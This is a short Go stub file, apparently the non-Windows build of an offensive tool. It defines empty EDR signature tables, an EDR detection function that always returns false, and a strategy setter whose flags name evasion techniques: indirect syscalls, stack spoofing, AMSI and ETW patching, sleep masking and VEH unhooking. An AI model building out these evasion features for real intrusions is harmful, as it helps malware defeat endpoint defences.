//go:build !windows

package main

var edrProcessSignatures = map[string][]string{}
var edrServiceSignatures = map[string][]string{}

func DetectEDR() *EDRInfo {
	return &EDRInfo{Detected: false}
}

func ApplyStrategy(s EvasionStrategy) {
	useIndirectSyscall = s.IndirectSyscall
	useStackSpoofing = s.StackSpoofing
	pebBlockDLLs = s.PEBBlockDLLs
	patchAMSI = s.AMSIPatch
	patchETW = s.ETWPatch
	enableSleepMask = s.SleepMask
	enableVEHUnhook = s.VEHUnhook
}

func (e *EDRInfo) GetStrategy() EvasionStrategy {
	return EvasionStrategy{Name: "none"}
}
